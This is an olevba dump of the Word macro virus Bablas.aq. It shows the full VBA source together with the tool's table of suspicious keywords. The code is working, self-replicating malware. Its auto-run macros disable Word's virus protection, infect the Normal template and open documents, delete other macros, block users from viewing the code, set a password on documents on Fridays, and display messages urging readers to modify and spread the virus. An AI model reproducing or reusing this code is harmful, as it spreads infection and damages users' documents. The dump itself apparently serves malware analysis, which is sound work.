olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.aq
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.aq - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mcik.bas 
in file: Virus.MSWord.Bablas.aq - OLE stream: 'Macros/VBA/Mcik'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Alert()
    If Month(Now()) = 7 Then
    Assistant.Visible = True
    With Assistant.NewBalloon
         .Icon = msoIconAlert
         .Text = "Happy birthday to...bieB"
         .Heading = "My heart to You"
         .Show
    End With
    ElseIf Month(Now()) = 11 Then
    Assistant.Visible = True
    With Assistant.NewBalloon
         .Icon = msoIconAlert
         .Text = "Congratulate for your Virus & Make Viruses Again & more destroyed"
         .Heading = "Happy birthday to..Macik"
         .Show
    End With
    End If
    End Sub
    Sub Alert1()
    If (WeekDay(Date) = vbFriday) And Time < TimeValue("11:59:59") Then
    Assistant.Visible = True
    With Assistant.NewBalloon
         .Icon = msoIconAlert
         .Text = " SHOLAT DULU YAAAA.."
         .Heading = "Sorry MCIK Lagi"
         .Show
    End With
    End If
    End Sub
Sub ShowMessage()
    If (WeekDay(Date) = vbFriday) And Time > TimeValue("11:00:00") And Time < TimeValue("11:59:59") Then
    If ActiveDocument.HasPassword = False Then
       ActiveDocument.Password = "bieB"
    End If
    For i = 1 To 100
        Beep
    Next i
    H = MsgBox("Sorry Agak Mengganggu", vbOKOnly + vbExclamation, "Macik")
    End If
End Sub

Sub Bablas()
Attribute Bablas.VB_Description = "Macro created 10/02/99 by  Abdul Aziz"
Attribute Bablas.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Cegat"
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub

Sub ToolsMacro()
    H = MsgBox("Microsoft Office Error.", vbExclamation + vbOKOnly)
End Sub

Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub HelpAbout()
    H = MsgBox("Salam dari Author....." & Chr(13) & Chr(13) & _
    "Bagi para Hacker atau yang sok Hacker!" & Chr(13) & _
    "di Yogya atau dimana aja, Anda boleh" & Chr(13) & _
    "Modifikasi ini Virus, Tapi jangan Asal" & Chr(13) & _
    "Nampang (jangan Malu-Maluin), Oke...!", vbOKOnly + vbExclamation, "Macik")
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Bablas
End Sub

Sub ChangeCap()
    On Error Resume Next
    Application.Caption = ".."
    ActiveWindow.Caption = "Mcik"
End Sub

Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub OpenMyMacro()
    If InputBox("Enter password") = "Mcik" Then Application.ShowVisualBasicEditor = True
End Sub

Sub SikatDocument()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "Mcik" Then DocOk = True
        If Obj.Name <> "Mcik" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="Mcik", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub SikatTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "Mcik" Then NorOk = True
        If Obj.Name <> "Mcik" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="Mcik", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    Alert1
    Application.Quit
End Sub

Sub FileOpen()
    ChangeCap
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SikatDocument
        ActiveDocument.Save
    End If
    RestoreCap
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    Bablas
    ChangeCap
    SikatTemplate
    On Error Resume Next
    NormalTemplate.Save
    RestoreCap
End Sub

Sub AutoClose()
    SikatDocument
    ShowMessage
End Sub

Sub FileClose()
    SikatDocument
    Alert
    ActiveDocument.Close
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        SikatDocument
        SikatTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub Ancurin()
    C = Documents.Count
    If C <> 0 Then
        Normal.Mcik.SikatDocument
        WordBasic.DisableAutoMacros False
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:00:10"), "Normal.Mcik.Ancurin"
    End If
End Sub

Sub AutoExec()
    WordBasic.DisableAutoMacros True
    Bablas
    Application.OnTime Now + TimeValue("00:00:10"), "Normal.Mcik.Ancurin"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

